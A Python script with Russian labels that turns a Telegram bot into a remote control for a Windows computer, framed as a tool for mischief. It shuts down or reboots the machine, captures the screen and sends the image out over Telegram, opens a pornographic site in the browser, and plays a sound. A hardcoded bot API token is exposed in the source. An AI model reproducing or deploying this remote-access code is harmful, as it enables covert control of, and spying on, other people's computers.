import telebot
from telebot import types
import os
from pyautogui import screenshot
from playsound import playsound
import webbrowser


bot =telebot.TeleBot("7503624325:AAHSIKr0NcmnPeWGhwmKLlxT75gxwjrGCeQ")
my_screenshot =open("screenshot.png", encoding="utf-8")
sound_file ="goyda.mp3"

@bot.message_handler(commands=["start"])
def main(message):
    if message.from_user.first_name != "Vesel4ak":
        return
    else:

        markup = types.ReplyKeyboardMarkup()
        button_1 = types.KeyboardButton("Завершение работы")
        button_2= types.KeyboardButton("Перезагрузка")
        button_3 = types.KeyboardButton("Снимок экрана")

        button_4 = types.KeyboardButton("Открытие черно-оранжевого ютюба")
        button_5 = types.KeyboardButton("Воспроизведение звука")

        markup.row(button_1,button_2,button_3)  # 1 ряд

        markup.row(button_4,button_5)

        bot.send_message(message.chat.id,f" Привет, {message.from_user.first_name} .Выбери действие,чтобы сегодня пошалить",reply_markup=markup)
        bot.register_next_step_handler(message,on_click)
def on_click(message):
     if message.text =="Завершение работы":
         os.system("shutdown /s /t 1")
         bot.send_message(message.chat.id, "Устройство выключено")
     elif message.text =="Перезагрузка":
         os.system("shutdown /r /t 1")
         bot.send_message(message.chat.id, "Перезагрузка уже началась")
     elif message.text =="Снимок экрана":
          my_screenshot =screenshot("screenshot.png")
          bot.send_photo(message.chat.id,my_screenshot)
          bot.send_message(message.chat.id,"Вот снимок экрана,только что сделаный на устройстве")
     elif message.text == "Открытие черно-оранжевого ютюба":
         webbrowser.open("pornhub.com")
     elif message.text =="Воспроизведение звука":
         playsound(sound_file)
         bot.send_message(message.chat.id,"Звук воспроизведен!")
bot.infinity_polling()